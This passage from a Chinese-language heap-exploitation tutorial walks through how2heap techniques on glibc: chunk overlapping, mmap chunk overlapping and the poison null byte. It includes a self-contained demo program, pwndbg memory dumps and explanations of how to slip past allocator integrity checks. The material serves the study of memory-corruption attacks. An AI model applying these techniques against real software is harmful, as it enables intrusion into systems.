的大小，不忽略掩码部分，另外一种是忽略掩码部分。在 ptmalloc 中，获取下一 chunk 块地址的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Ptr to next physical malloc_chunk. */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> next_chunk(p) ((mchunkptr)(((char *) (p)) + chunksize(p)))</span><br></code></pre></td></tr></table></figure><p>即使用当前块指针加上当前块大小。在 ptmalloc 中，获取前一个 chunk 信息的操作如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/* Size of the chunk below P.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_size(p) ((p)-&gt;mchunk_prev_size)</span><br><br><span class="hljs-comment">/* Ptr to previous physical malloc_chunk.  Only valid if prev_inuse (P).  */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prev_chunk(p) ((mchunkptr)(((char *) (p)) - prev_size(p)))</span><br></code></pre></td></tr></table></figure><p>即通过 malloc_chunk-&gt;prev_size 获取前一块大小，然后使用本 chunk 地址减去所得大小。<br>在 ptmalloc，判断当前 chunk 是否是 use 状态的操作如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> inuse(p)</span><br>    ((((mchunkptr)(((<span class="hljs-keyword">char</span> *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)<br></code></pre></td></tr></table></figure><p>即查看下一 chunk 的 prev_inuse 域，而下一块地址又如我们前面所述是根据当前 chunk 的 size 计算得出的。<br>简而言之，chunk extend 就是通过控制 size 和 pre_size 域来实现跨越块操作从而导致 overlapping 的。</p><h1 id="overlapping-chunks-2-2-23"><a href="#overlapping-chunks-2-2-23" class="headerlink" title="overlapping_chunks_2-2.23"></a>overlapping_chunks_2-2.23</h1><p>这是一个简单的堆块重叠问题。<br>也被称为非相邻 free chunk 合并攻击。<br>首先 malloc 五个堆块：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515531424-cd47ecf3-46e1-4d50-b4bf-18d77ec88df1.png#clientId=u347f053a-7aac-4&from=paste&height=337&id=ub7194792&name=image.png&originHeight=673&originWidth=1025&originalType=binary%E2%88%B6=1&size=589779&status=done&style=none&taskId=u03ef26d3-2974-4be4-84f7-dbebae19735&width=512.5" alt="image.png"><br>查看此时 heap<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515558942-de608b90-b069-4067-96a5-7d76a3cc3ffc.png#clientId=u347f053a-7aac-4&from=paste&height=322&id=u5270233b&name=image.png&originHeight=644&originWidth=680&originalType=binary%E2%88%B6=1&size=407793&status=done&style=none&taskId=ufa6339f8-57b8-46f0-bb5e-331d1df509f&width=340" alt="image.png"><br>输出</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">chunk p1 from <span class="hljs-number">0x8007010</span> to <span class="hljs-number">0x80073f840</span><br>chunk p2 from <span class="hljs-number">0x8007400</span> to <span class="hljs-number">0x80077e841</span><br>chunk p3 from <span class="hljs-number">0x80077f0</span> to <span class="hljs-number">0x8007bd842</span><br>chunk p4 from <span class="hljs-number">0x8007be0</span> to <span class="hljs-number">0x8007fc843</span><br>chunk p5 from <span class="hljs-number">0x8007fd0</span> to <span class="hljs-number">0x80083b8</span><br></code></pre></td></tr></table></figure><p>然后填充赋值<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515720689-8b0ac35b-ad27-4a5b-81df-052bbb9cc016.png#clientId=u347f053a-7aac-4&from=paste&height=317&id=u105dc4ed&name=image.png&originHeight=633&originWidth=982&originalType=binary%E2%88%B6=1&size=623807&status=done&style=none&taskId=u03d819ac-4cd2-486e-9a66-f124ca178ae&width=491" alt="image.png"><br>查看<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515836591-1f264a70-acb2-48e4-89b8-d2ecb4a63b33.png#clientId=u347f053a-7aac-4&from=paste&height=211&id=ue6c8de7d&name=image.png&originHeight=422&originWidth=1079&originalType=binary%E2%88%B6=1&size=445916&status=done&style=none&taskId=uce6ac4ca-4934-49e8-b21e-de027200e44&width=539.5" alt="image.png"><br>此时释放 p4，因为 p5 的存在所以 p4 不会被合并。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622515878233-3b2e58f0-c6d1-4322-8d2a-181a94bdf214.png#clientId=u347f053a-7aac-4&from=paste&height=355&id=u797679fd&name=image.png&originHeight=710&originWidth=864&originalType=binary%E2%88%B6=1&size=604887&status=done&style=none&taskId=u2e8d5858-ac53-43e5-8f9a-78adba03a9b&width=432" alt="image.png"><br>然后我们在 p1 触发一个溢出，将 p2 的 size 改写成 p2 和 p3 大小的和。之后更新 presize 的时候是通过 p2 的地址加上 p2 的 size 来寻找的要修改的位置的，这里刚好就把 p4 头部的 presize 给改掉了。<br>之后 free(p2)的时候，分配器就会认为 p4 是下一个块。然后就会错误地将 p3 和 p2 合并。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516023428-d9daa7d7-fe65-4445-8627-a57b829b2910.png#clientId=u347f053a-7aac-4&from=paste&height=477&id=u0779c540&name=image.png&originHeight=954&originWidth=1095&originalType=binary%E2%88%B6=1&size=1034227&status=done&style=none&taskId=u5fc07d71-872d-4906-b822-27999e48bb6&width=547.5" alt="image.png"><br>这时候 malloc 一个大小 2000 的堆 p6&lt;0xbd1，返回给 p6 的地址就是 p2 的地址了，p6 内部也包含了未被 free 的 p3，又造成了 overlapping，修改 p6 内容即可修改 p3 内容。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516230046-bd2ac17d-b73c-46c4-a0a0-bb91122f9472.png#clientId=u347f053a-7aac-4&from=paste&height=461&id=ud4e0d6d0&name=image.png&originHeight=922&originWidth=1062&originalType=binary%E2%88%B6=1&size=593880&status=done&style=none&taskId=u9824bb34-39a1-41f9-8491-007382d7ca3&width=531" alt="image.png"><br>我们就可以用 p6 改写 p3 中的任何数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516417819-5207045e-f9a8-4206-90b9-5b16c59a6899.png#clientId=u347f053a-7aac-4&from=paste&height=46&id=ub5b5f7af&name=image.png&originHeight=91&originWidth=403&originalType=binary%E2%88%B6=1&size=27579&status=done&style=none&taskId=u06c3ebff-470c-4903-a2ee-1de73baece8&width=201.5" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516428473-6460f742-890b-423a-9cdd-963f72cb0fbd.png#clientId=u347f053a-7aac-4&from=paste&height=45&id=u8a504495&name=image.png&originHeight=82&originWidth=385&originalType=binary%E2%88%B6=1&size=23281&status=done&style=none&taskId=ufc137763-aa72-417e-b0e3-19618068a5e&width=210.5" alt="image.png"><br>查看 p3 数据<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516463318-ff5da060-aa82-4e43-bdf9-adbffcb6ab26.png#clientId=u347f053a-7aac-4&from=paste&height=103&id=uff58dfc3&name=image.png&originHeight=206&originWidth=1821&originalType=binary%E2%88%B6=1&size=351670&status=done&style=none&taskId=u79b992fb-5ce9-4fef-a0c3-fa77c8646f3&width=910.5" alt="image.png"><br>修改之后<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516499843-8afc4529-02d1-4370-a068-f6ec15a44ab3.png#clientId=u347f053a-7aac-4&from=paste&height=373&id=ue02a99dc&name=image.png&originHeight=745&originWidth=1803&originalType=binary%E2%88%B6=1&size=1230606&status=done&style=none&taskId=u61a5de77-4b93-4de2-a164-2ca52e95455&width=901.5" alt="image.png"><br>与之前的 overlapping 相比，之前的是释放后修改 size，重新申请后覆盖了后面的堆；这个是先修改 size,使之大小覆盖了后面的堆，再释放后和已释放的大后个堆合并，包含了要覆盖的堆，重新申请后即可覆盖包含的堆的内容。</p><h1 id="mmap-overlapping-chunks-2-28"><a href="#mmap-overlapping-chunks-2-28" class="headerlink" title="mmap_overlapping_chunks-2.28"></a>mmap_overlapping_chunks-2.28</h1><p>代码翻译如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><br>    <span class="hljs-keyword">int</span>* ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;分配三个大小为 0x100000 的 chunk \n\n&quot;</span>);<br><br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* top_ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 块位于 Libc 上方： %p\n&quot;</span>,top_ptr);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第二个 mmap 块位于 Libc 下方： %p\n&quot;</span>, mmap_chunk_2);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* mmap_chunk_3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 块低于第二个 mmap 块: %p\n&quot;</span>, mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n当前系统内存布局\n&quot;</span> \<br><span class="hljs-string">&quot;================================================\n&quot;</span> \<br><span class="hljs-string">&quot;running program\n&quot;</span> \<br><span class="hljs-string">&quot;heap\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;third mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;second mmap chunk\n&quot;</span> \<br><span class="hljs-string">&quot;LibC\n&quot;</span> \<br><span class="hljs-string">&quot;....\n&quot;</span> \<br><span class="hljs-string">&quot;ld\n&quot;</span> \<br><span class="hljs-string">&quot;first mmap chunk\n&quot;</span><br><span class="hljs-string">&quot;===============================================\n\n&quot;</span> \<br>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第一个 mmap 的 prev_size: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-2</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第三个 mmap 的 size: 0x%llx\n\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n&quot;</span>);<br>    mmap_chunk_3[<span class="hljs-number">-1</span>] = (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_3[<span class="hljs-number">-1</span>]) + (<span class="hljs-number">0xFFFFFFFFFD</span> &amp; mmap_chunk_2[<span class="hljs-number">-1</span>]) | <span class="hljs-number">2</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在改掉的第三个 mmap 块的大小是: 0x%llx\n&quot;</span>, mmap_chunk_3[<span class="hljs-number">-1</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free 掉第三个 mmap 块,\n\n&quot;</span>);<br><br>    <span class="hljs-built_in">free</span>(mmap_chunk_3);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;再分配一个很大的 mmap chunk\n&quot;</span>);<br>    <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>* overlapping_chunk = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x300000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新申请的 Overlapped chunk 在: %p\n&quot;</span>, overlapping_chunk);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的大小是: 0x%llx\n&quot;</span>, overlapping_chunk[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">int</span> distance = mmap_chunk_2 - overlapping_chunk;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新的堆块与第二个 mmap 块之间的距离: 0x%x\n&quot;</span>, distance);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写入之前 mmap chunk2 的 index0 写的是: %llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;编辑 overlapping chunk 的值\n&quot;</span>);<br>    overlapping_chunk[distance] = <span class="hljs-number">0x1122334455667788</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;写之后第二个 chunk 的值: 0x%llx\n&quot;</span>, mmap_chunk_2[<span class="hljs-number">0</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Overlapped chunk 的值: 0x%llx\n\n&quot;</span>, overlapping_chunk[distance]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;新块已与先前的块重叠\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>一开始申请了 3 个 0x100000 大小的堆<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622810060975-70accae6-2d7b-4ea0-8c0b-2b8330d34090.png#clientId=u38185df4-f4d6-4&from=paste&height=418&id=JCTtJ&name=image.png&originHeight=835&originWidth=791&originalType=binary%E2%88%B6=1&size=677675&status=done&style=none&taskId=u9abe04a3-7168-40a6-9733-d55ff18f436&width=395.5" alt="image.png"><br>可以看到，普通堆区并没有分配的 0x100000 大小的堆。<br>然后查看相应的内存布局：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp">pwndbg&gt; n<br>The first mmap chunk goes directly above LibC: <span class="hljs-number">0x7fffff6a0010</span><br>The second mmap chunk goes below LibC: <span class="hljs-number">0x7fffff520010</span><br>The third mmap chunk goes below the second mmap chunk: <span class="hljs-number">0x7ffffef20010</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff6a0000</span><br><span class="hljs-number">0x7fffff6a0000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff6a0010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff6a0040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7fffff520000</span><br><span class="hljs-number">0x7fffff520000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7fffff520010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7fffff520040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x7ffffef20000</span><br><span class="hljs-number">0x7ffffef20000</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000101002</span><br><span class="hljs-number">0x7ffffef20010</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20020</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20030</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7ffffef20040</span>: <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br></code></pre></td></tr></table></figure><p>然后把第三个的 size 改成 0x202002<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622810875923-992f251d-9557-4137-8e74-cdc69483316b.png#clientId=u38185df4-f4d6-4&from=paste&height=309&id=njK7W&name=image.png&originHeight=618&originWidth=1017&originalType=binary%E2%88%B6=1&size=646248&status=done&style=none&taskId=u334e294b-3df8-4042-80a0-c97fe1330ba&width=508.5" alt="image.png"><br>free 掉第三个，然后再去 malloc(0x300000)<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811116922-428bdcdc-fd73-4cd7-ac2d-1ce2af6b62d8.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=XX3vY&name=image.png&originHeight=63&originWidth=582&originalType=binary%E2%88%B6=1&size=44129&status=done&style=none&taskId=u7f6741db-376b-47c4-8b1a-3c71138b5fb&width=291" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811179192-28d929d2-e624-4531-ab0c-caf74a4669fb.png#clientId=u38185df4-f4d6-4&from=paste&height=31&id=JApc7&name=image.png&originHeight=62&originWidth=559&originalType=binary%E2%88%B6=1&size=46123&status=done&style=none&taskId=u3a66a5c0-d5c7-442f-9723-717b01d968d&width=279.5" alt="image.png"><br>新块距离第二个 mmap 块 0x42000<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811244548-c1d89fc5-1bc6-40cf-a5f2-73788963b009.png#clientId=u38185df4-f4d6-4&from=paste&height=32&id=EofbB&name=image.png&originHeight=63&originWidth=886&originalType=binary%E2%88%B6=1&size=55992&status=done&style=none&taskId=ude624104-d595-499b-90f6-482b630f2ba&width=443" alt="image.png"><br>写入前 mmap 块 2 的索引 0 的值：0<br>写入后：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811684599-d2bec512-51f9-45cd-92fb-b85e96035c85.png#clientId=u38185df4-f4d6-4&from=paste&height=305&id=OfhSX&name=image.png&originHeight=610&originWidth=1033&originalType=binary%E2%88%B6=1&size=694967&status=done&style=none&taskId=u876b92d0-802b-4c31-8f55-072f7bb7b26&width=516.5" alt="image.png"><br>这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里的数据。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622811737939-fb0b2ec4-964e-486c-a510-6957d42e2803.png#clientId=u38185df4-f4d6-4&from=paste&height=469&id=nhwuf&name=image.png&originHeight=938&originWidth=875&originalType=binary%E2%88%B6=1&size=878998&status=done&style=none&taskId=u206739db-6236-4085-942e-83ed57c6cd1&width=437.5" alt="image.png"></p><h1 id="poison-null-byte-2-23"><a href="#poison-null-byte-2-23" class="headerlink" title="poison_null_byte-2.23"></a>poison_null_byte-2.23</h1><p><strong>翻译：</strong><br>这个技术可被用于当可以被 malloc 的区域（也就是 heap 区域）存在一个单字节溢出漏洞的时候。<br>我们先分配 0x100 个字节的内存，代号’a’。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516783705-1a5929d0-4167-480e-b877-236af6e0c2a1.png#clientId=u347f053a-7aac-4&from=paste&height=301&id=u5332779a&name=image.png&originHeight=601&originWidth=1052&originalType=binary%E2%88%B6=1&size=407596&status=done&style=none&taskId=u9d6172d7-16fa-44c2-aa70-87ac6d04b53&width=526" alt="image.png"><br>如果我们想要去溢出 a 的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是 0x108。<br>为什么是 0x108 呢，是因为所以 chunk 的头部需要占用 0x10 字节，但是 chunk 可以使用下一个 chunk 头部的 prev_size 位，就节省了 0x8 字节，所以最后是占用了 0x108 字节。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516826408-e6c8cfd8-c3b6-45be-875b-f49fd950ece7.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=u8b4851bd&name=image.png&originHeight=577&originWidth=1365&originalType=binary%E2%88%B6=1&size=728992&status=done&style=none&taskId=u63a5e533-4198-4fbe-a191-c2dca5db548&width=682.5" alt="image.png"><br>然后接着我们分配 0x200 个字节，代号’b’。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516845496-82a95d01-6617-4f14-adcc-5ab7991bc9af.png#clientId=u347f053a-7aac-4&from=paste&height=309&id=ue93ab3d7&name=image.png&originHeight=617&originWidth=1148&originalType=binary%E2%88%B6=1&size=649735&status=done&style=none&taskId=u9dc10b62-3b11-496b-95de-9caf3992412&width=574" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622725940259-9f402099-51f5-4f70-8786-852ace6f67d8.png#clientId=u347f053a-7aac-4&from=paste&height=148&id=uc5e70fd3&name=image.png&originHeight=295&originWidth=538&originalType=binary%E2%88%B6=1&size=159216&status=done&style=none&taskId=u63231e7b-2f8d-4edc-a4fc-2f82a057732&width=269" alt="image.png"><br>再分配 0x100 个字节，代号’c’。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622516858724-c8f09768-4c04-49d4-a253-2be2f9e7c20b.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u423519cb&name=image.png&originHeight=591&originWidth=1133&originalType=binary%E2%88%B6=1&size=405738&status=done&style=none&taskId=u94a732ca-f9f8-4ab6-84f2-7db0ec08c52&width=566.5" alt="image.png"><br>然后分配一个 0x100 字节的 barrier 在 0x8008440，以便在释放时 c 不会与顶部块合并（这个障碍并不是绝对必要的，但是可以让事情变得不那么混乱）<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517067038-3059645d-1235-4fd8-b8c8-c519a9deecde.png#clientId=u347f053a-7aac-4&from=paste&height=267&id=ub82ff069&name=image.png&originHeight=534&originWidth=510&originalType=binary%E2%88%B6=1&size=250039&status=done&style=none&taskId=ud073f0fb-3f9f-4b25-9808-51e3b549156&width=255" alt="image.png"><br>在新版 glibc 环境下，我们需要在 b 内部更新 size 来逃避检测 <strong>‘chunksize(P) != prev_size (next_chunk(P))’</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">*(<span class="hljs-keyword">size_t</span>*)(b+<span class="hljs-number">0x1f0</span>) = <span class="hljs-number">0x200</span>;<br><span class="hljs-built_in">free</span>(b)<br></code></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517147271-c235dd7c-5080-47c0-9fbb-185a04d6791c.png#clientId=u347f053a-7aac-4&from=paste&height=289&id=uc80f2690&name=image.png&originHeight=578&originWidth=685&originalType=binary%E2%88%B6=1&size=374695&status=done&style=none&taskId=u0671d3d9-a34a-469a-803d-96d98691d0d&width=342.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517208552-c7242d67-bb80-4700-9f3c-6c0c5cc8a5f0.png#clientId=u347f053a-7aac-4&from=paste&height=30&id=u73eedff9&name=image.png&originHeight=59&originWidth=186&originalType=binary%E2%88%B6=1&size=8472&status=done&style=none&taskId=uf4682486-08da-489c-b564-2ad6be3a5b5&width=93" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517199253-eff1e468-bfdd-416d-b51e-2e4c641b08cb.png#clientId=u347f053a-7aac-4&from=paste&height=28&id=u625cb874&name=image.png&originHeight=56&originWidth=453&originalType=binary%E2%88%B6=1&size=23547&status=done&style=none&taskId=u4744f654-460a-4710-984d-040fd67656f&width=226.5" alt="image.png"><br>此时堆内存布局如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622726539649-701affdb-ff6b-4d3b-bc4e-f72b77f4f629.png#clientId=u347f053a-7aac-4&from=paste&height=151&id=u9e500445&name=image.png&originHeight=301&originWidth=542&originalType=binary%E2%88%B6=1&size=122557&status=done&style=none&taskId=u129e444d-eeb5-4bda-a8a7-57a90e3829e&width=271" alt="image.png"></p><p>我们在 a 实现一个单字节的 null byte 溢出。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517393953-26a6095c-4771-4833-a47c-b62e09746449.png#clientId=u347f053a-7aac-4&from=paste&height=296&id=u14eaae63&name=image.png&originHeight=592&originWidth=1095&originalType=binary%E2%88%B6=1&size=548441&status=done&style=none&taskId=ubb192e74-9239-455a-a70e-f3635c1e1cf&width=547.5" alt="image.png"><br>可以看到 b 的 size 变成了 0x200<br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622517480514-0e4837dd-caf8-4112-bf9e-fa101aeaf55c.png#clientId=u347f053a-7aac-4&from=paste&height=196&id=udad05044&name=image.png&originHeight=392&originWidth=560&originalType=binary%E2%88%B6=1&size=215629&status=done&style=none&taskId=u54d31539-3a17-4293-b8d9-4d46d24dc77&width=280" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622726631071-e2b81bee-a247-4f1f-92be-381e4e70bd76.png#clientId=u347f053a-7aac-4&from=paste&height=147&id=t6067&name=image.png&originHeight=294&originWidth=542&originalType=binary%E2%88%B6=1&size=192046&status=done&style=none&taskId=ue48f1fd2-2a78-47b3-bc68-82d30fc82ee&width=271" alt="image.png"><br>为了在修改 chunk b 的 size 字段后，依然能通过 unlink 的检查，我们需要伪造一个 c.prev_size 字段，字段的大小是很好计算的，即</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp">(<span class="hljs-number">0x211</span> &amp; <span class="hljs-number">0xff00</span>) == <span class="hljs-number">0x200</span><br></code></pre></td></tr></table></figure><p>然而此时 c.presize = 0x210 但是没关系我们还是能逃过掉前面那个检查，根据</p><ul><li>chunksize(P) == _((size_t_)(b-0x8)) == 0x200</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1629942/1622727069161-149a5fe1-9220-46af-8cf9-029e67d5c6e2.png#clientId=u347f053a-7aac-4&from=paste&height=29&id=udb9d75df&name=image.png&originHeight=57&originWidth=349&originalType=binary%E2%88%B6=1&size=15531&status=done&style=none&taskId=u872d4aa7-ddf6-44cb-88ed-dcefeb1f8c9&width=174.5" alt="image.png"></p><ul><li>prev_size (next_chunk(P)) == _(size_t_)(b-0x10 + 0x200) == 0x200</li></ul><p><img 